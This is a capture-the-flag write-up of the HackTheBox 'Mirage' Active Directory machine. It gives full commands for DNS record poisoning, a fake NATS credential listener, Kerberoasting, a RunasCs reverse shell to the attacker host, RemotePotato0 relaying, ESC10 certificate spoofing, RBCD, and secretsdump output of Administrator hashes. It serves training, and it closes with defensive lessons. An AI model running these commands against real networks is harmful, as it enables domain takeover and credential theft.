---
title: Mirage
categories: [HackTheBox]
tags: [active-directory, nfs, dns-dynamic-update, nats, kerberoasting, remotepotato0, acl-abuse, gmsa, adcs, esc10, rbcd, certificate-based-authentication, privilege-escalation]
media_subpath: /images/hackthebox_mirage/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/5c9c46ad001394e992f1c7b830ee77e5.png'
---

## Summary

**Mirage** is a HackTheBox Active Directory machine that demonstrates a sophisticated multi-stage attack chain involving NFS share enumeration, DNS dynamic update vulnerabilities, NATS service exploitation, Kerberoasting, RemotePotato0 attacks, ACL abuse, GMSA password extraction, ADCS certificate-based attacks (ESC10), and Resource-Based Constrained Delegation (RBCD) exploitation. The initial compromise was achieved through mounting an NFS share that revealed incident reports mentioning a NATS service. By exploiting DNS dynamic updates, we added a malicious DNS record pointing to our attacker machine, allowing us to intercept NATS authentication credentials. These credentials were used to enumerate NATS streams and extract domain user credentials. Through Kerberoasting, we obtained access to `nathan.aadam`, which enabled WinRM access. Using RemotePotato0, we captured `mark.bbond`'s credentials, who had permissions to change passwords for `javier.mmarshall`. After modifying account restrictions, we used `javier.mmarshall` to read the GMSA password for `mirage-service$`. Finally, we exploited ADCS ESC10 vulnerability and RBCD to achieve Domain Admin privileges.

## Initial Enumeration

We begin with a comprehensive Nmap scan to identify open ports and services:

```bash
nmap -sVC -Pn -oN nmap 10.10.11.78
```

**Results:**
```
53/tcp    open  domain          syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec    syn-ack Microsoft Windows Kerberos (server time: 2025-08-12 03:17:54Z)
111/tcp   open  rpcbind         syn-ack 2-4 (RPC #100000)
135/tcp   open  msrpc           syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn     syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?   syn-ack
464/tcp   open  kpasswd5?       syn-ack
593/tcp   open  ncacn_http      syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap        syn-ack Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
2049/tcp  open  nlockmgr        syn-ack 1-4 (RPC #100021)
3268/tcp  open  ldap            syn-ack Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap        syn-ack Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
4222/tcp  open  vrml-multi-use? syn-ack
5985/tcp  open  http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf          syn-ack .NET Message Framing
47001/tcp open  http            syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

> **Analysis**: This is an Active Directory Domain Controller with:
> - **Port 53 (DNS)**: Domain name service
> - **Port 88 (Kerberos)**: Authentication service
> - **Port 389/636 (LDAP)**: Directory services
> - **Port 445 (SMB)**: File sharing
> - **Port 2049 (NFS)**: Network File System - **unusual for Windows!**
> - **Port 4222**: Unknown service (later identified as NATS)
> - **Port 5985 (WinRM)**: Windows Remote Management
{: .prompt-info}

### Domain Discovery

We use `nxc` (NetExec) to enumerate LDAP and discover the domain:

```bash
nxc ldap 10.10.11.78
```

![Domain Discovery](file-20250811201706114.png)

> **Domain**: `mirage.htb`
{: .prompt-info}

## NFS Share Enumeration

### Discovering NFS Shares

The presence of port 2049 (NFS) on a Windows domain controller is unusual. We enumerate available NFS shares:

```bash
showmount -e 10.10.11.78
```

![NFS Share Enumeration](file-20250811201833280.png)

> **Discovery**: An NFS share named `MirageReports` is available for mounting.
{: .prompt-warning}

### Mounting the NFS Share

We mount the NFS share to explore its contents:

```bash
sudo mount -t nfs 10.10.11.78:/MirageReports mnt
cd mnt
ls -la
```

### Reading Incident Reports

The share contains incident reports and authentication hardening documentation:

![Incident Reports](file-20250811201932269.png)

> **Critical Discovery**: The incident report mentions:
> - "Unable to resolve `nats-svc.mirage.htb`"
> - This suggests a NATS (messaging system) service that cannot be resolved via DNS
{: .prompt-danger}

## DNS Dynamic Update Vulnerability

### Understanding the Vulnerability

The incident report indicates DNS resolution issues with `nats-svc.mirage.htb`. We check the DNS server configuration:

![DNS Configuration](file-20250811202442849.png)

> **Critical Discovery**: The DNS server configuration shows "Dynamic updates nonsecure and secure" are enabled. This means we can potentially add DNS records if we have appropriate permissions.
{: .prompt-danger}

### DNS Update Attempt

We attempt to add a DNS record for `nats-svc.mirage.htb` pointing to our attacker machine:

```bash
nsupdate
server 10.10.11.78
update add nats-svc.mirage.htb 86400 A 10.10.14.4
send
quit
```

![DNS Update](file-20250811203427101.png)

> **Success**: The DNS record was successfully added!
{: .prompt-info}

### Verifying DNS Record

We verify the DNS record was created:

```bash
dig @mirage.htb nats-svc.mirage.htb
```

![DNS Verification](file-20250811203412534.png)

> The DNS record now points to our attacker machine (`10.10.14.4`).
{: .prompt-info}

## NATS Service Exploitation

### Understanding NATS

NATS is a messaging system. The incident report shows a user `dev_account_A` running:

```
.\nats -s nats://nats-svc:4222 rtt --user $user --password $password
```

![NATS Command](file-20250811203608720.png)

> **Strategy**: If a service tries to connect to `nats-svc.mirage.htb`, it will now resolve to our machine. We can set up a fake NATS server to intercept authentication credentials.
{: .prompt-warning}

### Setting Up Fake NATS Server

We create a fake NATS server that responds with a valid NATS INFO message:

```bash
while true; do echo -ne 'INFO {"server_id":"FAKE123","server_name":"nats-svc.mirage.htb","version":"2.11.3","proto":1,"auth_required":false,"max_payload":1048576}\r\n' | nc -lvnp 4222; done
```

![Fake NATS Server](file-20250811203726923.png)

> **Success**: We receive a connection with authentication credentials!
{: .prompt-info}

### Extracted Credentials

The connection reveals credentials for `dev_account_A`:
- **Username**: `dev_account_A`
- **Password**: (extracted from the connection)

> We now have valid domain credentials for `dev_account_A`.
{: .prompt-info}

## NATS Stream Enumeration

### Connecting to Real NATS Service

Using the extracted credentials, we connect to the actual NATS service on port 4222:

```bash
nats -s nats://10.10.11.78:4222 --user dev_account_A --password [PASSWORD]
```

### Enumerating Consumers

We list available consumers:

```bash
nats consumer ls
```

![NATS Consumers](file-20250811204328056.png)

### Enumerating Streams

We list and view streams to find sensitive information:

```bash
nats stream ls
nats stream view [STREAM_NAME]
```

![NATS Stream Credentials](file-20250811204426483.png)

> **Critical Discovery**: A stream contains credentials for `david.jjackson`!
{: .prompt-danger}

### Testing Credentials

We test the discovered credentials:

```bash
nxc smb 10.10.11.78 -u david.jjackson -p [PASSWORD]
```

![Valid Domain User](file-20250811204632699.png)

> **Success**: We have a valid domain user account!
{: .prompt-info}

## Kerberoasting Attack

### Identifying Kerberoastable Accounts

We perform Kerberoasting to extract service account hashes:

```bash
nxc ldap 10.10.11.78 -u david.jjackson -p [PASSWORD] --kerberoasting kerberoasting
```

![Kerberoasting Results](file-20250811205255737.png)

> **Discovery**: We successfully extracted Kerberos service tickets that can be cracked offline.
{: .prompt-info}

### Cracking the Hash

We crack the extracted hash using `hashcat`:

```bash
hashcat -m 13100 kerberoasting.hash /usr/share/wordlists/rockyou.txt
```

> **Result**: We obtain the password for account `nathan.aadam`.
{: .prompt-info}

## WinRM Access

### Generating Kerberos Configuration

We generate a Kerberos configuration file for authentication:

```bash
nxc smb 10.10.11.78 -u nathan.aadam -p [PASSWORD] --generate-krb5-file krb5
cat krb5 | sudo tee -a /etc/krb5.conf
```

### Accessing WinRM

We access the system via WinRM using Kerberos authentication:

```bash
evil-winrm -i 10.10.11.78 -r mirage.htb
```

![WinRM Access](file-20250811205621382.png)

> **Success**: We have shell access as `nathan.aadam`!
{: .prompt-info}

> **Technical Note**: Evil-WinRM connects over WinRM, which authenticates you with a Network logon (logon type 3 / LOGON32_LOGON_NETWORK). Network logons don’t create an interactive or Remote Desktop (TS) session on the host. Commands like query user and qwinsta rely on the Terminal Services APIs (WTSEnumerateSessions/WTSQuerySessionInformation) and only work when the calling process is associated with a real TS session and has the appropriate rights. From a pure WinRM/Evil-WinRM session, your token has no TS session context, so those APIs fail and query user doesn’t return the expected session list. 
{: .prompt-tip}

### Interactive Shell

For better enumeration, we use `RunasCs.exe` to get a reverse shell. This creates a different logon type (interactive or batch) with different privileges that allow us to query user sessions:

```powershell
.\RunasCs.exe nathan.aadam [PASSWORD] cmd.exe -r 10.10.14.4:9999
```

**Output:**
```
[*] Warning: The logon for user 'nathan.aadam' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-ace07$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 5272 created in background.
```

**Reverse Shell:**
```bash
rlwrap nc -lvnp 9999
```

```
Connection from 10.10.11.78:56634
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

> We now have an interactive command prompt on the target system.
{: .prompt-info}

## RemotePotato0 Attack

### Discovering Active Sessions

We check for active user sessions. Note that this command works in our reverse shell (created via `RunasCs.exe`) because it uses an interactive logon type, but would not work in a WinRM network session:

```powershell
query user
```

**Output:**
```
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 mark.bbond            console             1  Active      none   8/12/2025 3:52 PM
```

> **Discovery**: `mark.bbond` has an active console session. We can use RemotePotato0 to capture their credentials.
{: .prompt-warning}

> **Why This Works**: The reverse shell created by `RunasCs.exe` uses an interactive or batch logon type (`LOGON32_LOGON_INTERACTIVE` or `LOGON32_LOGON_BATCH`), which has the necessary privileges to query Terminal Services session information. This is why `query user` succeeds here but would fail in a WinRM network session.
{: .prompt-tip}

### BloodHound Analysis

We can also see this relationship in BloodHound:

![BloodHound Session](file-20250812215036272.png)

### RemotePotato0 Exploitation

RemotePotato0 is an attack that exploits the DCOM activation service to capture NTLM authentication. We set up the attack:

**On Attacker Machine:**
```bash
sudo socat -v TCP-LISTEN:135,fork,reuseaddr,bind=0.0.0.0 TCP:10.129.92.155:9999
```

**On Target Machine (as nathan.aadam):**
```powershell
.\RemotePotato0.exe -r 10.10.14.4 -p 9999 -x 10.10.14.4 -e 9998
```

![RemotePotato0 Setup](file-20250824014342251.png)

> **Success**: We captured `mark.bbond`'s NTLM hash!
{: .prompt-info}

## ACL Abuse - Password Change

### BloodHound Analysis

Using BloodHound, we discover that `mark.bbond` is a member of `it_support`, which has permissions to change the password of `javier.mmarshall`:

![ACL Relationship](file-20250813002946522.png)

### Changing javier.mmarshall's Password

We use `bloodyAD` to change the password:

```bash
bloodyAD --host 10.10.11.78 -d mirage.htb -u mark.bbond -p [HASH] -k set password javier.mmarshall 'P@$$word123!'
```

> **Success**: Password changed successfully!
{: .prompt-info}

### Account Restrictions

When attempting to authenticate, we encounter an error:

```
kdc_err_client_revoked
```

We check the account properties:

```powershell
Get-ADUser javier.mmarshall -properties *
```

**Output:**
```
logonHours {0,0,0,0...}
```

> **Discovery**: The account has `logonHours` restrictions (all zeros means no login hours allowed) and may be disabled.
{: .prompt-warning}

### Getting Shell as mark.bbond

We get a shell as `mark.bbond` to modify account properties:

![mark.bbond Shell](file-20250813003515704.png)

### Checking Security Descriptors

We examine the security descriptors for `javier.mmarshall`:

```bash
bloodyAD -d mirage.htb --dc-ip 10.10.11.78 -k --host 10.10.11.78 -u mark.bbond -p [HASH] get object javier.mmarshall --resolve-sd
```

![Security Descriptors](file-20250813004411801.png)

> **Discovery**: We have write permissions on UAC (User Account Control) and `logonHours` properties!
{: .prompt-info}

### Removing Account Restrictions

We remove the account disable flag:

```bash
bloodyAD -d mirage.htb --host 10.10.11.78 -u mark.bbond -p [HASH] -k remove uac -f ACCOUNTDISABLE javier.mmarshall
```

![Remove UAC](file-20250813004458477.png)

We clear the logon hours restriction:

```powershell
set-aduser javier.mmarshall -clear logonhours
```

![Clear Logon Hours](file-20250813004607606.png)

### Verifying Account Status

We verify the account is now enabled:

```powershell
Enable-ADAccount javier.mmarshall
set-aduser javier.mmarshall -clear logonhours
get-aduser javier.mmarshall -properties logonhours
```

![Account Enabled](file-20250813010459642.png)

> **Success**: The account is now enabled and can be used for authentication!
{: .prompt-info}

## GMSA Password Extraction

### Reading GMSA Password

Using `javier.mmarshall` credentials, we can read the GMSA (Group Managed Service Account) password for `mirage-service$`:

![GMSA Password](file-20250813010641291.png)

> **Critical Discovery**: We successfully extracted the GMSA password for `mirage-service$`!
{: .prompt-danger}

## ADCS Certificate Enumeration

### Discovering Certificates

We use Certipy to enumerate certificates for the service account:

```bash
KRB5CCNAME=mirage-svc.ccache certipy find -u 'mirage-service$@mirage.htb' -dc-ip 10.10.11.78 -dc-host dc01.mirage.htb -k -no-pass -enabled -hide-admins
```

> **Discovery**: We find certificates that can be exploited.
{: .prompt-info}

## ESC10 Vulnerability Exploitation

### Understanding ESC10

ESC10 is a vulnerability in ADCS where weak certificate mapping for Schannel authentication allows impersonation. We check the certificate mapping methods:

```powershell
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL' -Name CertificateMappingMethods
```

![Certificate Mapping](file-20250813012651268.png)

> **Discovery**: The system uses weak certificate mapping, making it vulnerable to ESC10.
{: .prompt-warning}

### BloodHound Analysis - mark.bbond Permissions

We discover that `javier.mmarshall` has write permissions on `mark.bbond`'s `public-information` property:

![mark.bbond Permissions](file-20250813024000531.png)

![Security Descriptors Detail](file-20250813024102531.png)

![Property Set Write](file-20250813024135113.png)

### Modifying UPN

We can modify `mark.bbond`'s User Principal Name (UPN) to impersonate the domain controller:

```bash
certipy account -k \
    -dc-ip 10.10.11.78 -target dc01.mirage.htb -upn 'dc01$@mirage.htb' \
    -user 'mark.bbond' update
```

**Output:**
```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'
```

> **Success**: We changed `mark.bbond`'s UPN to `dc01$@mirage.htb`!
{: .prompt-info}

### Requesting Certificate

We request a certificate for `mark.bbond` (which now has UPN `dc01$@mirage.htb`):

```bash
KRB5CCNAME=mark.ccache certipy req -dc-ip 10.10.11.78 -target dc01.mirage.htb -ca 'mirage-DC01-CA' -template User -username mark.bbond@mirage.htb -p 'P@$$word123!' -k
```

**Output:**
```
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Saving certificate and private key to 'dc01.pfx'
```

> **Critical Success**: We obtained a certificate for the domain controller machine account!
{: .prompt-danger}

### Restoring Original UPN

We restore `mark.bbond`'s original UPN:

```bash
certipy account \
    -k -target dc01.mirage.htb -dc-host dc01.mirage.htb\
    -dc-ip 10.10.11.78 -upn 'mark.bbond@mirage.htb' \
    -user 'mark.bbond' update
```

## Certificate-Based Authentication

### Authenticating with Certificate

We authenticate to LDAP using the certificate:

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
```

**Output:**
```
[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
```

> **Success**: We are authenticated as the domain controller machine account!
{: .prompt-info}

## Resource-Based Constrained Delegation (RBCD)

### Setting RBCD

We configure Resource-Based Constrained Delegation, allowing `mirage-service$` to impersonate users on `dc01$`:

```bash
# In certipy LDAP shell
set_rbcd dc01$ mirage-service$
```

**Output:**
```
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
mirage-service$ can now impersonate users on dc01$ via S4U2Proxy
```

> **Success**: RBCD is configured! `mirage-service$` can now impersonate any user on `dc01$`.
{: .prompt-info}

### Requesting Service Ticket

We use `getST.py` to request a service ticket for `DC01$` impersonating `DC01$`:

```bash
getST.py -spn 'cifs/dc01.mirage.htb' -impersonate DC01$ -dc-ip 10.10.11.78 mirage.htb/Mirage-Service$ -no-pass
```

**Output:**
```
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
```

> **Success**: We obtained a service ticket for the domain controller!
{: .prompt-info}

## Domain Admin Compromise

### Dumping Administrator Hash

We use the service ticket to dump the Administrator hash:

```bash
KRB5CCNAME=DC01\$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache secretsdump.py -just-dc-user administrator -k -no-pass 'mirage.htb/dc01$'@dc01.mirage.htb
```

**Output:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
```

> **Domain Compromise**: We successfully extracted the Administrator NTLM hash!
{: .prompt-danger}

### Getting Administrator TGT

We generate a Kerberos ticket for the Administrator:

```bash
getTGT.py -hashes ':7be6d4f3c2b9c0e3560f5a29eeb1afb3' mirage.htb/Administrator
```

**Output:**
```
[*] Saving ticket in Administrator.ccache
```

![Domain Admin Access](file-20250813025938836.png)

> **Complete Domain Compromise**: We now have full domain administrator access!
{: .prompt-danger}

## Conclusion

### Quick Recap

- **NFS Share Enumeration**: Discovered incident reports mentioning NATS service
- **DNS Dynamic Update**: Exploited DNS to add malicious record pointing to attacker machine
- **NATS Exploitation**: Intercepted authentication credentials by hosting fake NATS server
- **Stream Enumeration**: Extracted domain user credentials from NATS streams
- **Kerberoasting**: Obtained service account password
- **RemotePotato0**: Captured `mark.bbond` credentials via RemotePotato
- **ACL Abuse**: Changed `javier.mmarshall` password and removed account restrictions
- **GMSA Extraction**: Read GMSA password for `mirage-service$`
- **ESC10 Exploitation**: Modified UPN to impersonate domain controller and obtained certificate
- **RBCD Attack**: Configured delegation to impersonate users on domain controller
- **Domain Admin**: Dumped Administrator hash and achieved complete domain compromise

### Lessons Learned

- **NFS Security**: NFS shares on Windows systems should be properly secured and monitored
- **DNS Dynamic Updates**: DNS dynamic updates should be restricted to authorized sources only
- **NATS Security**: Service authentication should use strong credentials and proper network segmentation
- **Kerberos Security**: Service accounts should use strong passwords to resist Kerberoasting
- **Session Security**: Active user sessions can be exploited via attacks like RemotePotato0
- **ACL Management**: Access Control Lists must be properly configured to prevent unauthorized password changes
- **GMSA Security**: Group Managed Service Accounts should have restricted read permissions
- **ADCS Security**: Certificate mapping methods should be properly configured to prevent ESC10
- **RBCD Security**: Resource-Based Constrained Delegation must be carefully managed
